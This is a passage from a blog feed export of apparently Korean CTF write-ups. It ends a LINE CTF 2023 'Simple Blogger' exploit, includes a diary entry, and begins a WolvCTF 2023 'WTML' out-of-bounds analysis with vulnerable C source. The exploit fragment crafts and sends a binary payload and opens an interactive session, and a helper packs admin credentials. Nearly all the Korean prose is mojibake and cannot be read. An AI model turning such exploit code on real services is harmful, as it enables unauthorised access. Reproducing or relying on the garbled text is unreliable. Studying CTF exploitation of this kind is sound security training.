class="comment"># operation 1~6 # 1</span></span><br><span class="line">payload += token <span class="comment"># 16Î∞îÏù¥Ìä∏ token# 2</span></span><br><span class="line">payload += p16(<span class="built_in">len</span>(msg), endian=<span class="string">&#x27;big&#x27;</span>) <span class="comment"># 18</span></span><br><span class="line">payload += msg</span><br><span class="line"></span><br><span class="line">pause()</span><br><span class="line">p.send(payload) </span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><img src="/images/230405-linectf2023-simple_blogger/flag.png" width=500/><br><h2 id="tmi"><a href="#tmi" class="headerlink" title="tmi"></a>tmi</h2><p>Ï≤òÏùåÏóê agent Ìè¥ÎçîÎ•º ÌôïÏù∏ÌñàÏúºÎ©¥ Î¨∏Ï†ú ÌíÄÏù¥Í∞Ä Îçî Îπ®ÎûêÏùÑ Í≤ÉÏù¥Îùº ÌåêÎã®ÎêúÎã§. agent Ìè¥ÎçîÏóêÏÑúÎäî cronÏùÑ Ïù¥Ïö©Ìï¥ÏÑú Îß§Î∂ÑÎßàÎã§ adminÏúºÎ°ú Î°úÍ∑∏Ïù∏Ìï¥ÏÑú database ÎÇ¥Ïö©ÏùÑ ÏßÄÏö∞Îäî Ïó≠Ìï†ÏùÑ ÌïúÎã§. Ï∞∏Í≥†Î°ú Ïù¥ Í∏∞Îä•ÏùÄ <code>ping</code> Ìï®ÏàòÏóê ÏûàÎã§. ÏïÑÎ¨¥Ìäº Ï†ÄÎü∞ Ïó≠Ìï†ÏùÑ ÌïòÎäîÎç∞, Ï†ÄÍ±∏ ÏàòÌñâÌïòÍ∏∞ ÏúÑÌï¥ ÌååÏù¥Ïç¨ Ïä§ÌÅ¨Î¶ΩÌä∏Í∞Ä ÌïòÎÇò Îì§Ïñ¥ÏûàÏóàÎã§. </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">auth</span>():</span><br><span class="line">    payload = <span class="string">b&#x27;\x01\x02&#x27;</span></span><br><span class="line">    payload += <span class="string">b&#x27;\x41&#x27;</span>*<span class="number">16</span></span><br><span class="line">    cred = <span class="string">&#x27;&#123;0&#125;:&#123;1&#125;&#x27;</span>.<span class="built_in">format</span>(ADMIN_USER, ADMIN_PASS)</span><br><span class="line">    cred_len = <span class="built_in">len</span>(cred)</span><br><span class="line">    payload += struct.pack(<span class="string">&#x27;&gt;H&#x27;</span>, cred_len)</span><br><span class="line">    payload += cred.encode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(payload)</span><br><span class="line">    <span class="keyword">return</span> payload</span><br></pre></td></tr></table></figure><p>ÏùºÎ∂ÄÎ∂ÑÎßå Í∞ÄÏ†∏ÏôîÎäîÎç∞, Ïù¥Í±∏ Îπ®Î¶¨ Î¥§ÏúºÎ©¥ Íµ¨Ï°∞Ï≤¥Î•º Îçî ÏâΩÍ≥† Îπ†Î•¥Í≤å Î∂ÑÏÑùÌï¥ÏÑú ÏÑúÎ≤ÑÏùò Í∏∞Îä•ÏùÑ Ï°∞Í∏à Îçî Îπ®Î¶¨ Ìä∏Î¶¨Í±∞Ìï† Ïàò ÏûàÏßÄ ÏïäÏïòÏùÑÍπå ÎùºÎäî ÏÉùÍ∞ÅÏù¥ Îì†Îã§. ÌïòÏßÄÎßå ÎçïÎ∂ÑÏóê Î∂ÑÏÑùÏóê ÎåÄÌïú ÏûêÏã†Í∞êÏùÑ ÏñªÏóàÏúºÎãà.. ÎÇòÏÅúÍ±¥ ÏóÜÎã§Í≥† ÏÉùÍ∞ÅÎêúÎã§.</p><p>Í∑∏Î¶¨Í≥† Ïù¥ cronÏúºÎ°ú Ï≤òÏùåÏóê ÏùµÏä§ Î∞©Ìñ•ÏùÑ Ìó∑Í∞àÎ†∏ÎäîÎç∞, Ï†Ä ÌååÏù¥Ïç¨ Ïä§ÌÅ¨Î¶ΩÌä∏Î•º Ïã§ÌñâÌïòÎ©¥ Î©îÎ™®Î¶¨Ïóê adminÏùò passwordÍ∞Ä ÎÇ®ÏïÑÏÑú <code>ping</code> Ìï®ÏàòÎ•º ÌÜµÌï¥ leakÌï† Ïàò ÏûàÏóàÎã§. (Î¨ºÎ°† Î°úÏª¨ÏóêÏÑúÎßå.. ÎèÑÏª§ÎèÑ ÏïÑÎãàÍ≥†..) Î°úÏª¨ÏóêÏÑúÎßå Í∞ÄÎä•ÌñàÎçò Ïù¥Ïú†Îäî .. Ï†Ä ÌååÏù¥Ïç¨ Ïä§ÌÅ¨Î¶ΩÌä∏Î•º ÏùµÏä§ ÏΩîÎìúÏóê Ìè¨Ìï®ÏãúÏºú cronÌïòÎäî Í≤ÉÏ≤òÎüº Ìï¥Ï§¨Îã§. Ïù¥Î†áÍ≤å ÌïòÎ©¥ ÌÅ∞ÏùºÎÇúÎã§. „Öé Ïï†Ï¥àÏóê ÎßêÎèÑ ÏïàÎêòÎäî ÏÉùÍ∞ÅÏù¥Îãà Ïù¥Ìï¥ÌïòÎ†§Í≥† ÌïòÏßÄ ÎßêÏûê.</p><p>ÏïÑ Í∑∏Î¶¨Í≥† ÏùºÏ£ºÏùº Ï†ÑÏóê ÎåÄÌöå ÏÑúÎ≤ÑÎ°ú Î¨∏Ï†úÎ•º ÌíÄ Îïå guestÎ°úÎèÑ Î°úÍ∑∏Ïù∏Ïù¥ ÏïàÎêòÎäî Ïù¥ÏäàÍ∞Ä ÏûàÏóàÎã§. ÎåÄÌöå Ï§ëÏóêÎäî Î¨∏Ï†ú Ìë∏ÎäîÎç∞ ÏßÄÏû•Ïù¥ ÏóÜÎã§Í≥† Í≥µÏßÄÌïòÏòÄÎã§Í≥† ÌïúÎã§. ÎåÄÌöå Îïå ÌíÄÏù¥ÌïòÎ†§Í≥† ÌñàÏúºÎ©¥.. <code>ping</code> Ìï®ÏàòÎßå Ïó¥Ïã¨Ìûà Î¥§Í≤†ÏßÄ..? ÏïÑÎ¨¥Ìäº Ïù¥Î≤à Í∏∞ÌöåÎ•º ÌÜµÌï¥ ctf Í∏∞Í∞ÑÏóê Ïó¥Ïã¨Ìûà Ï∞∏Ïó¨Ìï¥ÏïºÌï† Ïù¥Ïú†Î•º ÎäêÍºàÎã§. Í∏∞Í∞Ñ ÎÇ¥Ïóê ÌíÄÏóàÏúºÎ©¥ Îçî Í∏∞Î∂Ñ Ï¢ãÏïòÏùÑ Í≤É Í∞ôÎã§. ÏÇ¨Ïã§ ÎÅùÎÇòÍ≥† ÌíÄÏñ¥ÎèÑ Í∏∞Î∂ÑÏ¢ãÍ∏¥ ÌïòÎã§.</p><p>Ïù¥ Î¨∏Ï†úÎ•º ÌíÄÍ≥† Í∑∏ Îã§Ïùå Î¨∏Ï†úÎèÑ Ïó¥Ïñ¥Î¥§ÎäîÎç∞ ÏÇ¨Ïã§ ÏïÑÏßÅÍπåÏßÄ ÏùµÏä§ ÏΩîÎìúÎ•º Ïä§Ïä§Î°ú ÏûëÏÑ±ÌïòÏßÄ Î™ªÌïòÏòÄÎã§. ÏöîÏ¶ò Îã§Î•∏Í±∞Ïóê Îπ†Ï†∏ÏÑú.. ÏïÑÎ¨¥Ìäº comming soon..</p>]]></content>
      
      
      <categories>
          
          <category> WriteUp </category>
          
          <category> LINE </category>
          
      </categories>
      
      
        <tags>
            
            <tag> leak </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2023-03-31 Diary</title>
      <link href="/230331-diary/"/>
      <url>/230331-diary/</url>
      
        <content type="html"><![CDATA[<p>Î≤åÏç® 2023ÎÖÑ 1Î∂ÑÍ∏∞Í∞Ä ÎÅùÎÇ¨Îã§. Í∑∏Î¶¨Í≥† Ïò¨Ìï¥ Ï≤´ ÏùºÍ∏∞Î•º Ïç®Î≥¥Î†§Í≥† ÌïúÎã§. </p><h2 id="Github-Blog-ISSUE"><a href="#Github-Blog-ISSUE" class="headerlink" title="Github Blog ISSUE"></a>Github Blog ISSUE</h2><p>ÏñºÎßà Ï†ÑÏóê Ïù¥ Î∏îÎ°úÍ∑∏Ïóê Ïù¥ÏäàÍ∞Ä ÏûàÏóàÎã§. (ÏÇ¨Ïã§ Î∞îÎ°ú Ïñ¥Ï†ú..) localhostÏóêÏÑúÎäî Î≥ÄÍ≤ΩÏÇ¨Ìï≠Ïù¥ Î™®Îëê Î∞òÏòÅÎêòÏóàÎäîÎç∞ ÎßâÏÉÅ deployÎ•º ÌïòÎãà Î≥ÄÍ≤ΩÏÇ¨Ìï≠Ïù¥ ÌïòÎÇòÎèÑ Ï†ÄÏû• ÏïàÎêú Í≤ÉÏù¥Îã§;; Ïö∏ Îªî ÌñàÎã§. ÌïòÏßÄÎßå ÏûëÏùÄ Î≥ÄÍ≤ΩÏÇ¨Ìï≠ÏùÑ Ï§Ä Îí§Ïóê Îã§Ïãú ÏãúÎèÑÌï¥Î≥¥Îãà deployÍ∞Ä Ïûò ÎêòÏóàÎã§. </p><img src="/images/230331-diary/Screenshot 2023-03-31 at 14.56.53.png" width=500/><br><h2 id="English"><a href="#English" class="headerlink" title="English"></a>English</h2><p>ÏòÅÏñ¥ Í≥µÎ∂ÄÎ•º Ïó¥Ïã¨Ìûà ÌïòÍ≥† ÏûàÎã§. ÎßêÌïòÎäî Îç∞ ÏûàÏñ¥ÏÑú Î¨∏Ïû• Íµ¨Ï°∞Í∞Ä Ìó∑Í∞àÎ¶∞Îã§? ÎÇòÎäî Î¨∏Î≤ïÏù¥ Î∂ÄÏ°±ÌñàÍ≥† Í≥µÎ∂ÄÌï¥Î≥¥Îãà ÌäπÌûà ÏãúÏ†úÏóê ÎåÄÌïú Ïù¥Ìï¥Í∞Ä ÎÇÆÏïòÎã§. <code>The present perfact tense</code> ÎùºÎäî Î¨∏Î≤ïÏù¥ ÏûàÎäîÎç∞ ÌïúÍµ≠Ïñ¥Î°úÎäî Í≥ºÍ±∞Î∂ÑÏÇ¨ÎùºÍ≥† ÌñàÎçò Í≤É Í∞ôÎã§. ÏïÑÎ¨¥Ìäº Ï†Ä ÏãúÏ†úÏùò Î¨∏Ïû•ÏùÑ Î≥¥Î©¥ Í∞êÏù¥ Ïûò ÏïàÏôîÎäîÎç∞ ÎìúÎîîÏñ¥ Í∞êÏùÑ Ïû°Í≥† Ïù¥Ìï¥Î•º ÌñàÎã§. 10ÎåÄ Îïå Î∂ÑÎ™Ö Í≥µÎ∂ÄÌñàÏùÑ Í±¥Îç∞ Í∑∏ÎïåÎäî Ïñ¥ÎñªÍ≤å Ïù¥Ìï¥ÌñàÎäîÏßÄ Í∏∞ÏñµÏù¥ Ïûò ÏïàÎÇúÎã§. </p><p>Ïã†Í∏∞Ìïú Í≤ÉÏù¥ Í≥µÎ∂ÄÎ•º ÌïòÎã§Î≥¥Îãà ÎÇòÏùò ÏïΩÏ†êÏùÑ ÌååÏïÖÌï† Ïàò ÏûàÏóàÎã§. ÏòÅÏñ¥ Í≥µÎ∂ÄÎ•º ÏãúÏûëÌïòÍ∏∞ Ï†ÑÏóêÎäî Î¶¨Îî©, Î¶¨Ïä§Îãù, Ïä§ÌîºÌÇπ, Î°∏Ïù¥ÌåÖ Ï§ë Î≠êÍ∞Ä Í∞ÄÏû• ÏûêÏã†ÏûàÍ≥† Î∂ÄÏ°±ÌïúÏßÄ Î™∞ÎûêÎã§. ÌïòÏßÄÎßå Í≥µÎ∂ÄÎ•º ÏßÑÌñâÌïòÎã§ Î≥¥Îãà Ïä§ÌîºÌÇπÏù¥ Ï†ïÎßêÏ†ïÎßê Î∂ÄÏ°±Ìïú Í≤ÉÏùÑ Íπ®Îã¨ÏùÑ Ïàò ÏûàÏóàÎã§. Í∑∏Î¶¨Í≥† ÏùòÏô∏Î°ú Î¶¨Ïä§Îãù Ïã§Î†•Ïù¥ Í∞ÄÏû• Ï¢ãÏùÄ Í≤É Í∞ôÎã§. Î¶¨Îî©ÏùÄ Í¥ÄÏã¨ ÏûàÎäî Ï£ºÏ†úÎäî Ïûò ÏùΩÌûàÎäî Í≤É Í∞ôÎã§. (Î™®Î•¥Îäî Îã®Ïñ¥Í∞Ä ÏóÜÏñ¥ÏÑú Í∑∏Îü¥ Í≤ÉÏù¥Îùº ÏÉùÍ∞ÅÌïúÎã§.) ÏöîÏ¶ò Î™®ÎèôÏà≤Ïóê Îπ†Ï°åÎäîÎç∞ RedditÏóêÏÑú Î™®ÎèôÏà≤ Í¥ÄÎ†® Í∏ÄÏù¥ ÏûêÏ£º Ïò¨ÎùºÏò§Îã§Î≥¥ÎãàÍπå Ïã¨Ïã¨Ìï† Îïå ÏùΩÏúºÎ©¥ Ïû¨Î∞åÎã§. ÏÇ¨Ïã§ Ïû¨Î∞åÎã§Í∏∞ Î≥¥Îã§Îäî Î™®Î•¥Îäî ÏÇ¨Ïã§ÏùÑ ÏïåÍ≤åÎêòÍ±∞ÎÇò Í∑ÄÏó¨Ïö¥ Í≤ÉÎì§ÏùÑ Î≥º Ïàò ÏûàÍ≤å ÎêúÎã§. Ïä§ÌîºÌÇπÏù¥ Í∞ÄÏû• Î∂ÄÏ°±Ìïú Ïù¥Ïú†Í∞Ä ÎÇ¥Í∞Ä Î∂ÄÎÅÑÎü¨ÏõÄÏù¥ ÎßéÏùÄ ÏÑ±Í≤©Ïù¥Í∏∞ ÎïåÎ¨∏Ïù¥ÎùºÍ≥† ÏÉùÍ∞ÅÎêúÎã§. Í∑πÎ≥µÌïòÍ≥† Ïã∂ÏùÄÎç∞ ÏÉùÍ∞ÅÎ≥¥Îã§ ÏâΩÏßÄ ÏïäÎã§.</p><h2 id="ACNH-Animal-Crossing-New-Horizon"><a href="#ACNH-Animal-Crossing-New-Horizon" class="headerlink" title="ACNH (Animal Crossing New Horizon)"></a>ACNH (Animal Crossing New Horizon)</h2><p>ÏûëÎÖÑ ÎßêÏóê ÎãåÌÖêÎèÑ Ïä§ÏúÑÏπòÎûë Î™®Ïó¨Î¥êÏöî ÎèôÎ¨ºÏùò Ïà≤ Í≤åÏûÑÏùÑ ÏÑ†Î¨ºÎ∞õÏïòÎã§. Í∑∏ Îïå Ïó¥Ïã¨Ìûà ÌïòÎã§Í∞Ä ÏÉàÌï¥ Îïå Ïò§ÎûúÎßåÏóê Îì§Ïñ¥Í∞ÄÍ≥† 3ÏõîÍπåÏßÄ Í∑∏ÎåÄÎ°ú Î∞©ÏπòÌï¥ÎíÄÎã§Í∞Ä 3Ïõî Ï¥àÏóê ÍπîÎÅîÌïòÍ≤å Î¶¨ÏÖãÌñàÎã§. ÏßÄÍ∏àÏùÄ Îß§Ïö∞ Ïû¨Î∞åÍ≤å Ï¶êÍ∏∞Í≥† ÏûàÎã§. ÏßÄÌòï Í≥µÏÇ¨Î•º ÌïòÍ≥† ÏûàÎäîÎç∞ ÎÖ∏Í∞ÄÎã§ Í≥ºÏ†ïÏù¥Í∏¥ Ìï¥ÎèÑ ÎøåÎìØÌïòÍ≥† ÎÇòÎ¶Ñ Ïû¨Î∞åÎã§. (ÎÇ¥ Ï∫êÎ¶≠ÌÑ∞Í∞Ä Í∑ÄÏó¨ÏõåÏÑú ÎîîÏä§ÏΩîÎìú ÌîÑÎ°úÌïÑ ÏÇ¨ÏßÑÎèÑ Î≥ÄÍ≤ΩÌñàÎã§.) Í∑∏Î¶¨Í≥† Ï£ºÎØºÎì§Í≥º Ïù¥ÏïºÍ∏∞ÌïòÎã§Î≥¥Î©¥ ÎÑàÎ¨¥ ÌûêÎßÅÎêúÎã§.</p><p>Î¨¥Ìä∏ÏΩîÏù∏ÏúºÎ°ú 800ÎßåÏõêÏ†ïÎèÑ Î≤åÏñ¥ÏÑú ÏïÑÏßÅ Îèà Í±±Ï†ï ÏóÜÏù¥ ÌñâÎ≥µÌïòÍ≤å Ï¶êÍ∏∞Í≥† ÏûàÎã§. ÏßÄÍ∏àÍπåÏßÄ ÏïΩ 120ÏãúÍ∞Ñ Ï†ïÎèÑ Ìïú ÎìØ..</p><h2 id="Algorithm"><a href="#Algorithm" class="headerlink" title="Algorithm"></a>Algorithm</h2><p>Streak ÏßÑÏßú.. „Öã„Öã Ï§ëÍ∞ÑÏóê Íπ®Ï†∏ÏÑú Îã§Ïãú ÌïòÍ≥† ÏûàÎäîÎç∞ ÏóÑÌïú Í≥≥Ïóê Streak freeze Ïç®Î≤ÑÎ†∏Îã§.. Ìïò.. ÏïÑÏßÅ Ïã§Î≤Ñ1Ïù∏Îç∞ Ïñ∏Ï†ú Í≥®ÎìúÎê†Íπå? ÎùºÍ≥† ÎßêÌïòÍ∏∞ÏóêÎäî ÏöîÏ¶ò ÏïåÍ≥†Î¶¨Ï¶òÌïòÍ∏∞ Í∑ÄÏ∞ÆÏïÑÏÑú Ïâ¨Ïö¥ Í≤ÉÎßå Í≥®Îùº ÌíÄÍ≥† ÏûàÎã§.  </p><img src="/images/230331-diary/Screenshot 2023-03-31 at 15.51.38.png" width=600/><br><p>Í∞ëÏûêÍ∏∞ solve.ac UIÍ∞Ä Î∞îÎÄåÏñ¥ÏÑú Ï¢Ä ÎãπÌô©ÌñàÏßÄÎßå.. Í∞úÏù∏Ï†ÅÏúºÎ°ú Ïù¥Ï†Ñ UIÍ∞Ä Îçî Ï¢ãÏùÄ Í≤É Í∞ôÎã§.. </p><h2 id="CTF"><a href="#CTF" class="headerlink" title="CTF"></a>CTF</h2><p>Ïõ¨ÎßåÌïòÎ©¥ CTFÎ•º Íæ∏Ï§ÄÌûà Ï∞∏Ïó¨ÌïòÎ†§Í≥† ÎÖ∏Î†•ÌïòÍ≥† ÏûàÎã§. 2023ÎÖÑ Í∏∞Ï§Ä Í∏∞ÏñµÏóê ÎÇ®Îäî Î¨∏Ï†úÎ•º ÏÜåÍ∞úÌïúÎã§.</p><ul><li>idek CTFÏùò SpinterÎ¨∏Ï†ú: <a href="https://jiravvit.github.io/230117-idekctf2023-sprinter/">https://jiravvit.github.io/230117-idekctf2023-sprinter/</a></li></ul><p>FSBÎ•º Ìä∏Î¶¨Í±∞Ìï† Ïàò ÏûàÎäîÎç∞ <code>n</code>Ïù¥ ÌïÑÌÑ∞ÎßÅÎêòÏñ¥ ÏûàÎã§. Ïñ¥ÎñªÍ≤å overflowÎ•º ÏùºÏúºÏºúÏïºÌïòÎäîÏßÄ Í≥†ÎØºÏùÑ Ìï¥ÏïºÌïúÎã§. ÎòêÌïú canaryÍ∞Ä ÏûàÍ∏∞ ÎïåÎ¨∏Ïóê Ïù¥Î•º Ïñ¥ÎñªÍ≤å Ïö∞ÌöåÌïòÍ±∞ÎÇò leakÌï¥ÏïºÌï† ÏßÄ. Ïûò Î≥¥Ï°¥ÏùÑ Ïñ¥ÎñªÍ≤å Ìï¥ÏïºÌï† ÏßÄ Í≥†ÎØºÌï† Ïàò ÏûàÎäî Î¨∏Ï†úÎã§.</p><ul><li>Karmar CTFÏùò mjsÎ¨∏Ï†ú: <a href="https://jiravvit.github.io/230318-kalmarctf2023-mjs/">https://jiravvit.github.io/230318-kalmarctf2023-mjs/</a></li></ul><p>Ï≤´ JS engine exploitÏù¥ÎùºÍ≥† Í±∞Ï∞ΩÌïòÍ≤å ÎßêÌïòÏßÄÎßå ÏùòÏô∏Î°ú ÏâΩÍ≤å Î¨∏Ï†ú ÌíÄ Ïàò ÏûàÎäî Î∞©Ìñ•Ïù¥ Ï°¥Ïû¨ÌïúÎã§. javascriptÎ°ú ÏùµÏä§ ÏΩîÎìúÎ•º ÏûëÏÑ±ÌïòÎäî Í±¥ Ïó≠ÏãúÎÇò Ïñ¥Î†µÎã§. Ïù¥ Î¨∏Ï†úÎ•º ÌíÄÎ©¥ÏÑú Îã§Î•∏ Ïú†Î™ÖÌïú JS engine 1-day Î∂ÑÏÑùÌï¥Î≥¥Í≥† Ïã∂Îã§Í≥† ÏÉùÍ∞ÅÌñàÎã§. Î∂ÑÏÑùÌïòÍ≤å ÎêòÎ©¥.. Î∏îÎ°úÍ∑∏Ïóê Ï†ïÎ¶¨ÌïòÎèÑÎ°ù ÎÖ∏Î†•Ìï¥Î≥¥Í≤†Îã§.</p><ul><li>Wolv CTFÏùò WTMLÎ¨∏Ï†ú: <a href="https://jiravvit.github.io/230322-wolvctf2023-WTML/">https://jiravvit.github.io/230322-wolvctf2023-WTML/</a></li></ul><p>ÏñºÎßà Ï†ÑÏóê ÏûàÏóàÎçò Ïî®ÌÖùÏù¥Îã§. Í≤ΩÍ≥Ñ Í≤ÄÏÇ¨Î•º Ï†úÎåÄÎ°ú Î™ªÌï¥ÏÑú oobÍ∞Ä Î∞úÏÉùÌïòÎäî Î¨∏Ï†úÎäî ÎÇ¥Í∞Ä Ïûò Î™ªÏ∞æÍ∏∞ÎèÑ ÌïòÍ≥† Î¨∏Ï†ú ÌíÄÍ≥† ÎøåÎìØÌï¥ÏÑú Ïó¨Í∏∞ ÎÑ£Ïñ¥Î¥§Îã§.</p><ul><li>Line CTFÏùò Simple BloggerÎ¨∏Ï†ú: ÏóÖÎ°úÎìú ÏòàÏ†ï</li></ul><p>ÎåÄÌöå ÎñÑ ÌíÄÏóàÏúºÎ©¥ Îçî ÏâΩÍ≥† Îπ®Î¶¨ ÌíÄÏóàÏùÑ ÌÖêÎç∞.. ÏßÑÏßú ÎÑàÎ¨¥ ÏïÑÏâΩÎã§. ÎåÄÌöå ÎèÑÏ§ë ÏïΩÏÜçÏù¥ ÏûàÏñ¥ÏÑú ÎåÄÌöåÎ•º Ï∞∏Ïó¨ÌïòÏßÄ Î™ªÌïòÍ≥† ÎåÄÌöå ÎÅùÎÇòÍ≥† Î¨∏Ï†úÎ•º ÌíÄÏñ¥Î¥§Îã§. Ï†ïÎßê Ïó¥Ïã¨Ìûà Î∂ÑÏÑùÌñàÍ≥† Î∂ÑÏÑùÏùÑ ÏóÑÏ≤≠ Ïó¥Ïã¨Ìûà Ìïú Í±∞Ïóê ÎπÑÌï¥ Ïñ¥Ïù¥ÏóÜÍ≤å Î¨∏Ï†úÍ∞Ä ÌíÄÎ†∏Îã§. Î∂ÑÏÑùÌïòÎ©¥ÏÑú ÏûëÎÖÑ Ïù¥Îßò ÎïåÏùò ÎÇòÎäî Ï†àÎåÄ Î™ªÌë∏Îäî Î¨∏Ï†úÏùº Í≤ÉÏù¥ÎùºÎäî ÏÉùÍ∞ÅÏù¥ Îì§ÏóàÎã§. Îã§Î•∏ Î¨∏Ï†úÎ•º Ìë∏ÎäêÎùº ÏïÑÏßÅ Î∏îÎ°úÍ∑∏Ïóê ÏóÖÎ°úÎìú ÌïòÏßÄÎäî ÏïäÏïòÎäîÎç∞ Îπ®Î¶¨ ÏóÖÎ°úÎìúÌï¥ÏïºÍ≤†Îã§.</p><ul><li>Line CTFÏùò HackatrisÎ¨∏Ï†ú: ÏóÖÎ°úÎìú ÏòàÏ†ï</li></ul><p>Í∞úÏù∏Ï†ÅÏúºÎ°ú Í≤åÏûÑ Í¥ÄÎ†®Îêú Î¨∏Ï†úÎ•º ÏïàÏ¢ãÏïÑÌïúÎã§. Î∂ÑÏÑùÏù¥ ÍπåÎã§Î°≠Í≥† ÏΩîÎìúÍ∞Ä Í∏∏Í∏∞ ÎñÑÎ¨∏Ïù¥Îã§. ÌïòÏßÄÎßå ÏïûÏùò Simple Blogger Î¨∏Ï†úÎ•º ÌíÄÍ≥†ÎÇòÏÑú ÏûêÏã†Í∞êÏù¥ ÏÉùÍ≤® Î∞îÏù¥ÎÑàÎ¶¨Î•º Ïó¥Ïñ¥Î¥§Îã§. Î∂ÑÏÑùÏùÑ Ïó¥Ïã¨Ìûà ÏßÑÌñâÌïú Í≤∞Í≥º Ï∑®ÏïΩÏ†ê, ÌíÄÏù¥ Î∞©Ìñ•ÏùÄ Îã§ ÏïåÍ≤†ÏúºÎÇò Ïù¥Í±∏ ÎÇ¥Í∞Ä ÏΩîÎìúÎ°ú ÏûëÏÑ±Ìï¥ÏÑú ÏùµÏä§Ìï† Ïàò ÏûàÏùÑÍπå..?ÎûÄ ÏùòÎ¨∏Ïù¥ Îì§ÏóàÎã§. Í∑∏ÎûòÏÑú Î°∏ÏóÖÏùÑ Ï†ïÎßê Ïì±! Î¥§ÎäîÎç∞ ÎÇ¥Í∞Ä ÏÉùÍ∞ÅÌïú ÌíÄÏù¥ Î∞©Ìñ•Í≥º ÎèôÏùºÌñàÎã§. ÏΩîÎìúÎ°ú ÏûëÏÑ±ÌïòÎäîÍ±∞ Ï°∞Í∏à Ïó∞Íµ¨Ìï¥Î≥¥Í≥†.. Î∏îÎ°úÍ∑∏Ïóê ÏóÖÎ°úÎìúÌïòÎèÑÎ°ù ÎÖ∏Î†•ÌïòÍ≤†Îã§.</p><h2 id="Î™©Ìëú"><a href="#Î™©Ìëú" class="headerlink" title="Î™©Ìëú"></a>Î™©Ìëú</h2><p>Ïö¥Îèô Íæ∏Ï§ÄÌûà ÌïòÍ≥† Ïã∂Îã§.. ^^</p>]]></content>
      
      
      <categories>
          
          <category> Diary </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Diary </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>WolvCTF 2023 - WTML (pwn, oob)</title>
      <link href="/230322-wolvctf2023-WTML/"/>
      <url>/230322-wolvctf2023-WTML/</url>
      
        <content type="html"><![CDATA[<ul><li><a href="https://ctftime.org/event/1866">https://ctftime.org/event/1866</a></li></ul><blockquote><p>This cool intermediate service receives WTML bodies and replaces tags. How useful! Is it vulnerable?<br><code>nc wtml.wolvctf.io 1337</code></p></blockquote><ul><li>[21 solves &#x2F; 489 points]</li></ul><p>ÏÜåÏä§ÏΩîÎìúÍ∞Ä Ï£ºÏñ¥Ï†∏ ÏûàÍ≥† Í∏∏Ïù¥ÎèÑ ÏßßÏïÑÏÑú Ìè¨ÎÑàÎ∏î Î¨∏Ï†ú Ï§ëÏóê Í∞ÄÏû• Î®ºÏ†Ä ÏÜêÎåÄÎ¥§Îã§.</p><h2 id="Analysis"><a href="#Analysis" class="headerlink" title="Analysis"></a>Analysis</h2><p>ÏÜåÏä§ÏΩîÎìúÍ∞Ä Ï£ºÏñ¥Ï†∏ ÏûàÏñ¥ÏÑú ÏÜåÏä§ÏΩîÎìúÏúÑÏ£ºÎ°ú Î∂ÑÏÑùÌñàÎã§.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdbool.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MESSAGE_LEN 0x20</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="title function_">void</span> <span class="params">(*tag_replacer_func)</span><span class="params">(<span class="type">char</span> *message, <span class="type">char</span> from, <span class="type">char</span> to)</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">tag_replacer</span> &#123;</span></span><br><span class="line">    <span class="type">uint8_t</span> id;</span><br><span class="line">    tag_replacer_func funcs[<span class="number">2</span>];</span><br><span class="line">&#125; __attribute__((packed)) tag_replacer;</span><br><span 